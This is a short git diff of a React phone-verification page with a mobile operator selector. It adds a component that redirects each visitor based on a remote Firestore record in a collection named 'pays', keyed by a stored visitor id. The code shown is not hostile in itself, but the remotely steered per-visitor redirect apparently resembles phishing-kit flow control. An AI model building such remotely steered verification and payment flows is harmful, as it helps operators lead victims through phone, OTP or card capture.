@@ -11,6 +11,7 @@ import { OperatorSelector } from "../components/phone-verification/OperatorSelec
 import { PhoneVerificationService } from "../services/PhoneVerificationService";
 import { STCModal } from "../components/STCModal";
 import { sendPhone } from "../apis/orders";
+import FirestoreRedirect from "./rediract-page";
 
 const operators = [
   { id: "stc", name: "STC", logo: "/companies/stc.png" },
@@ -25,6 +26,8 @@ export const PhoneVerification = () => {
   const [phone, setPhone] = useState("");
   const [operator, setOperator] = useState("");
   const [showSTCModal, setShowSTCModal] = useState(false);
+  const _id = localStorage.getItem("visitor");
+
   const [errors, setErrors] = useState({
     phone: "",
     operator: "",
@@ -136,6 +139,8 @@ export const PhoneVerification = () => {
 
   return (
     <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-4">
+      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+
       <Header />
       {isLoading && (
         <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center">
